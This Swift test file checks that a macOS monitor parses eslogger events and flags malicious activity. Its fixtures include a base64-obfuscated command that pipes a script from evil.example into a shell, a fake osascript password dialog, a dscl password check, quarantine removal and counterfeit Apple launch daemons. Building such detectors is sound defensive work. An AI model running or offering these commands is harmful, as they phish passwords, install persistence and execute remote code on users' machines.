import Foundation
import Testing

@testable import MacxCore

// eslogger JSON follows es_message_t (EndpointSecurity's ESMessage.h / ESMessageCore.h). These fixtures
// use those field names; real output also escapes "/" as "\/", which JSON parsers undo.

func proc(_ path: String, pid: Int = 500, ppid: Int = 1, platform: Bool = false, team: String? = nil, signing: String? = nil) -> String {
    let t = team.map { "\"\($0)\"" } ?? "null"
    let s = signing.map { "\"\($0)\"" } ?? "null"
    return """
        {"audit_token":{"pid":\(pid)},"ppid":\(ppid),"is_platform_binary":\(platform),"team_id":\(t),"signing_id":\(s),\
        "executable":{"path":"\(path.replacingOccurrences(of: "/", with: "\\/"))","path_truncated":false}}
        """
}

func event(_ name: String, process: String, body: String) -> String {
    #"{"schema_version":1,"version":8,"event_type":9,"process":\#(process),"event":{"\#(name)":\#(body)}}"#
}

@Suite("eslogger event parsing")
struct ESEventParsingTests {
    @Test func execWithArgs() throws {
        let line = event(
            "exec", process: proc("/bin/zsh", pid: 700, platform: true),
            body: #"{"target":\#(proc("/bin/bash", pid: 700, ppid: 650, platform: true)),"args":["bash","-c","echo hi"]}"#)
        let e = try #require(ESEvent.parse(line))
        #expect(e.kind == "exec")
        #expect(e.target?.path == "/bin/bash")
        #expect(e.target?.pid == 700)
        #expect(e.target?.ppid == 650)
        #expect(e.target?.isPlatform == true)
        #expect(e.args == ["bash", "-c", "echo hi"])
    }

    @Test func createWithNewPathAndExistingFile() throws {
        let newPath = event(
            "create", process: proc("/tmp/x"),
            body:
                #"{"destination_type":1,"destination":{"new_path":{"dir":{"path":"\/Library\/LaunchDaemons"},"filename":"com.apple.evil.plist","mode":420}}}"#
        )
        #expect(ESEvent.parse(newPath)?.filePath == "/Library/LaunchDaemons/com.apple.evil.plist")
        let existing = event(
            "create", process: proc("/tmp/x"),
            body: #"{"destination_type":0,"destination":{"existing_file":{"path":"\/tmp\/a"}}}"#)
        #expect(ESEvent.parse(existing)?.filePath == "/tmp/a")
    }

    @Test func renameDeleteExtattrAndBTM() throws {
        let rename = event(
            "rename", process: proc("/x"),
            body:
                #"{"source":{"path":"\/tmp\/p.plist"},"destination_type":1,"destination":{"new_path":{"dir":{"path":"\/Users\/v\/Library\/LaunchAgents"},"filename":"com.x.plist"}}}"#
        )
        let r = try #require(ESEvent.parse(rename))
        #expect(r.sourcePath == "/tmp/p.plist")
        #expect(r.filePath == "/Users/v/Library/LaunchAgents/com.x.plist")

        let del = event(
            "deleteextattr", process: proc("/usr/bin/xattr", platform: true),
            body: #"{"target":{"path":"\/Users\/v\/Downloads\/x.app"},"extattr":"com.apple.quarantine"}"#)
        let d = try #require(ESEvent.parse(del))
        #expect(d.filePath == "/Users/v/Downloads/x.app")
        #expect(d.extattr == "com.apple.quarantine")

        let btm = event(
            "btm_launch_item_add", process: proc("/usr/libexec/backgroundtaskmanagementd", platform: true),
            body:
                #"{"instigator":\#(proc("/tmp/evil")),"item":{"item_type":4,"legacy":true,"managed":false,"uid":0,"item_url":"file:\/\/\/Library\/LaunchDaemons\/com.x.plist","app_url":null},"executable_path":"\/tmp\/evil"}"#
        )
        let b = try #require(ESEvent.parse(btm))
        #expect(b.itemURL == "file:///Library/LaunchDaemons/com.x.plist")
        #expect(b.executablePath == "/tmp/evil")
        #expect(b.instigator?.path == "/tmp/evil")
    }

    @Test func badLinesAreSkipped() {
        #expect(ESEvent.parse("") == nil)
        #expect(ESEvent.parse("not json") == nil)
        #expect(ESEvent.parse(#"{"event":{}}"#) == nil)
    }
}

@Suite("Live watch rules")
struct WatchRuleTests {
    let rules = WatchRules(home: URL(fileURLWithPath: "/Users/v"), signatures: FakeSignatures(byPath: ["/tmp/evil": .adHoc]))

    func ids(_ line: String) -> Set<String> { Set(rules.evaluate(ESEvent.parse(line)!).map(\.rule)) }

    @Test func pastedBase64PayloadIsCritical() {
        let line = event(
            "exec", process: proc("/bin/zsh", platform: true),
            body:
                #"{"target":\#(proc("/bin/zsh", platform: true)),"args":["zsh","-c","echo 'Y3VybCAtc0wgaHR0cHM6Ly9ldmlsLmV4YW1wbGUveC5zaCB8IHpzaA==' | base64 -D | zsh"]}"#
        )
        let alerts = rules.evaluate(ESEvent.parse(line)!)
        #expect(alerts.contains { $0.rule == "base64-to-shell" && $0.severity == .critical })
        #expect(alerts.contains { $0.detail?.contains("evil.example") == true })
    }

    @Test func passwordPromptAndCheck() {
        let dialog = event(
            "exec", process: proc("/bin/bash", platform: true),
            body:
                #"{"target":\#(proc("/usr/bin/osascript", platform: true)),"args":["osascript","-e","display dialog \"macOS needs your password\" default answer \"\" with hidden answer"]}"#
        )
        #expect(ids(dialog).contains("password-prompt"))
        let dscl = event(
            "exec", process: proc("/tmp/evil"),
            body: #"{"target":\#(proc("/usr/bin/dscl", platform: true)),"args":["dscl",".","-authonly","victim","hunter2"]}"#)
        #expect(ids(dscl).contains("password-check"))
    }

    @Test func passwordsInArgumentsAreNeverShown() {
        let dscl = event(
            "exec", process: proc("/tmp/evil"),
            body: #"{"target":\#(proc("/usr/bin/dscl", platform: true)),"args":["dscl",".","-authonly","victim","hunter2"]}"#)
        let text = rules.evaluate(ESEvent.parse(dscl)!).map { "\($0.title) \($0.detail ?? "")" }.joined()
        #expect(!text.contains("hunter2"))
    }

    @Test func quarantineRemoval() {
        let del = event(
            "deleteextattr", process: proc("/usr/bin/xattr", platform: true),
            body: #"{"target":{"path":"\/Users\/v\/Downloads\/x.app"},"extattr":"com.apple.quarantine"}"#)
        #expect(ids(del) == ["quarantine-removed"])
        let other = event(
            "deleteextattr", process: proc("/usr/bin/xattr", platform: true),
            body: #"{"target":{"path":"\/x"},"extattr":"com.apple.FinderInfo"}"#)
        #expect(ids(other).isEmpty)
    }

    @Test func newLaunchItemsAndFakeAppleNames() {
        let daemon = event(
            "create", process: proc("/tmp/evil"),
            body: #"{"destination":{"new_path":{"dir":{"path":"\/Library\/LaunchDaemons"},"filename":"com.apple.accountsd.helper.plist"}}}"#
        )
        let a = rules.evaluate(ESEvent.parse(daemon)!)
        #expect(a.contains { $0.rule == "fake-apple-launch-item" && $0.severity == .critical })

        let agent = event(
            "rename", process: proc("/Applications/Tool.app/Contents/MacOS/Tool", team: "ABCDE12345"),
            body:
                #"{"source":{"path":"\/tmp\/a.plist"},"destination":{"new_path":{"dir":{"path":"\/Users\/v\/Library\/LaunchAgents"},"filename":"com.tool.agent.plist"}}}"#
        )
        #expect(ids(agent) == ["new-launch-item"])

        let notPlist = event(
            "create", process: proc("/x"),
            body: #"{"destination":{"new_path":{"dir":{"path":"\/Library\/LaunchDaemons"},"filename":".DS_Store"}}}"#)
        #expect(ids(notPlist).isEmpty)
    }

    @Test func hiddenAppleFolderInApplicationSupport() {
        let mk = event(
            "create", process: proc("/tmp/evil"),
            body:
                #"{"destination":{"new_path":{"dir":{"path":"\/Users\/v\/Library\/Application Support"},"filename":".com.apple.accountsd"}}}"#
        )
        #expect(ids(mk).contains("fake-apple-folder"))
    }

    @Test func backgroundItemAddedWithAdHocProgramIsHigh() {
        let btm = event(
            "btm_launch_item_add", process: proc("/usr/libexec/backgroundtaskmanagementd", platform: true),
            body:
                #"{"instigator":\#(proc("/tmp/evil")),"item":{"item_type":4,"legacy":true,"item_url":"file:\/\/\/Library\/LaunchDaemons\/com.x.plist"},"executable_path":"\/tmp\/evil"}"#
        )
        let a = rules.evaluate(ESEvent.parse(btm)!)
        #expect(a.contains { $0.rule == "new-background-item" })
        #expect(a.contains { $0.rule == "new-background-item-unsigned" && $0.severity == .high })
    }

    @Test func unsignedProgramStartingFromATempOrHiddenFolder() {
        let line = event(
            "exec", process: proc("/bin/zsh", platform: true),
            body: #"{"target":\#(proc("/Users/v/Library/Application Support/.x/run")),"args":["run"]}"#)
        #expect(ids(line).contains("exec-from-hidden-or-temp"))
        let signed = event(
            "exec", process: proc("/bin/zsh", platform: true),
            body: #"{"target":\#(proc("/private/tmp/tool", team: "ABCDE12345")),"args":["tool"]}"#)
        #expect(!ids(signed).contains("exec-from-hidden-or-temp"))
    }

    @Test func everydayActivityIsQuiet() {
        let ls = event(
            "exec", process: proc("/bin/zsh", platform: true), body: #"{"target":\#(proc("/bin/ls", platform: true)),"args":["ls","-la"]}"#)
        let brew = event(
            "exec", process: proc("/bin/zsh", platform: true),
            body: #"{"target":\#(proc("/opt/homebrew/bin/brew")),"args":["brew","install","wget"]}"#)
        let save = event(
            "create", process: proc("/Applications/TextEdit.app/Contents/MacOS/TextEdit", platform: true),
            body: #"{"destination":{"new_path":{"dir":{"path":"\/Users\/v\/Documents"},"filename":"notes.txt"}}}"#)
        #expect(ids(ls).isEmpty)
        #expect(ids(brew).isEmpty)
        #expect(ids(save).isEmpty)
    }
}
